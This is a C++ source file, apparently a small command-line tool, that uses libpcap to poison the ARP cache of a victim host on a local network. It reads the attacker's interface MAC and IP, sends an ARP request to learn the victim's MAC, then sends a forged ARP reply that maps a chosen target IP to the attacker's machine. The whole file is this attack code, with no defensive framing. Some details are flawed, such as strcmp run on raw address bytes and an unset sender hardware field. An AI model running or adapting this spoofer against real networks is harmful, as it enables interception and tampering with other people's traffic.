#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-headers.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <cstring>
#include <iostream>

struct libnet_ethernet_hdr ehtH;
struct libnet_arp_hdr arpH;
struct arpAddr {
	u_int8_t sha[6];
	u_int8_t spa[4];
	u_int8_t tha[6];
	u_int8_t tpa[4];
} req, end;

void getAttacker(char* dev) {
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	struct ifreq s;
	strcpy(s.ifr_name, dev);

	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(ehtH.ether_shost, s.ifr_hwaddr.sa_data, sizeof(s.ifr_hwaddr.sa_data));

	ioctl(fd, SIOCGIFADDR, &s);
	memcpy(req.spa, (void*)&(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), sizeof(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));
}

void makearp(char* ti, u_int16_t arpop) {
	for(int i=0; i<6; i++) {
		ehtH.ether_dhost[i] = '\xff';
		req.sha[i] = ehtH.ether_shost[i];
		req.tha[i] = 0;
	}

	ehtH.ether_type = ntohs(ETHERTYPE_ARP);
	arpH.ar_hrd = ntohs(ARPHRD_ETHER);
	arpH.ar_pro = ntohs(ETHERTYPE_IP);
	arpH.ar_hln = 6;
	arpH.ar_pln = 4;
	arpH.ar_op = ntohs(arpop);
	inet_pton(AF_INET, ti, req.tpa);
}

void makepacket(u_int8_t* packet, struct arpAddr a) {
	memcpy(packet, &ehtH, sizeof(struct libnet_ethernet_hdr));
        memcpy(packet+sizeof(struct libnet_ethernet_hdr), &arpH, sizeof(struct libnet_arp_hdr));
        memcpy(packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr), &a, sizeof(struct arpAddr));
}

int main(int argc, char* argv[]) {

	if (argc != 4) {
		return -1;
	}

	char* dev = argv[1];

	getAttacker(dev);

	char* senderip = argv[2];
	makearp(senderip, ARPOP_REQUEST);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	u_int8_t size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + sizeof(struct arpAddr);
	u_int8_t arppacket[size];

	makepacket(arppacket, req);

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		pcap_sendpacket(handle, arppacket, size);

		struct libnet_ethernet_hdr* replyehtH = (struct libnet_ethernet_hdr *)packet;

		if(ntohs(replyehtH->ether_type) == ETHERTYPE_ARP) {
			packet += sizeof(struct libnet_ethernet_hdr);
			packet += sizeof(struct libnet_arp_hdr);
			struct arpAddr* reply = (struct arpAddr *)packet;
			if(strcmp((char*)req.tpa, (char*)reply->spa) == 0){
				for(int i=0; i<6; i++) end.tha[i] = reply->sha[i];
				break;
			}
		}
	}

	for(int i=0; i<6; i++) ehtH.ether_dhost[i] = end.tha[i];
	inet_pton(AF_INET, argv[3], end.spa);
	arpH.ar_op = ntohs(ARPOP_REPLY);
	makepacket(arppacket, end);

	pcap_sendpacket(handle, arppacket, size);

	printf("\n");
	return 0;
}
